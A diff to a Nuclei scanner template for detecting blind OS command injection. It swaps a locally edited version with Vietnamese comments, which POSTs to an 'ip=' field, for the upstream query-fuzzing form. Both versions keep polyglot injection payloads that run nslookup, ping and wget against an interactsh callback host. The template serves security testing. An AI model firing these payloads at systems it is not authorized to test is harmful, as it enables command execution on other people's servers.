@@ -1,5 +1,5 @@
 id: cmdi-blind-oast-polyglot
-# edit
+
 info:
   name: Blind OS Command Injection
   author: pdteam,geeknik
@@ -13,37 +13,28 @@ info:
   metadata:
     max-request: 4
   tags: cmdi,oast,dast,blind,polyglot
-# oast: chèn các payload có khả năng kích hoạt yêu cầu mạng ra bên ngoài, sử dụng server tương tác để nhận các callback khi payload được kích hoạt
+
 variables:
   marker: "{{interactsh-url}}"
-# interactsh là doman đặc biệt do nuclei cung cấp
+
 http:
-  # cũ
-  # - pre-condition: #điều kiện
-  #     - type: dsl
-  #       dsl:
-  #         - 'method == "GET"'
-    #them
-  - method: POST
-    path:
-      - "{{BaseURL}}"
-    
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
 
-    body: "ip=127.0.0.1{{payload}}&Submit=Submit"
-
-# gửi các pay load lên server cần tấn công -> nếu tại url nuclei có nhận được phản hồi -> lỗi
     payloads:
       payload:
         - "&nslookup {{marker}}&'\\\"`0&nslookup {{marker}}&`'"
         - "1;nslookup${IFS}{{marker}};#${IFS}';nslookup${IFS}{{marker}};#${IFS}\";nslookup${IFS}{{marker}};#${IFS}"
         - "/*$(nslookup {{marker}})`nslookup {{marker}}``*/-nslookup({{marker}})-'/*$(nslookup {{marker}})`nslookup {{marker}}` #*/-nslookup({{marker}})||'\"||nslookup({{marker}})||\"/*`*/"
         - "$(ping -c 1 {{marker}} | nslookup {{marker}} ; wget {{marker}} -O /dev/null)"
-# bỏ đi vì ở trên đã set path rồi (phần này đang chèn payload vào)
-    # fuzzing:
-    #   - part: query
-    #     type: postfix
-    #     fuzz:
-    #       - "{{payload}}"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        fuzz:
+          - "{{payload}}"
 
     stop-at-first-match: true
     matchers:
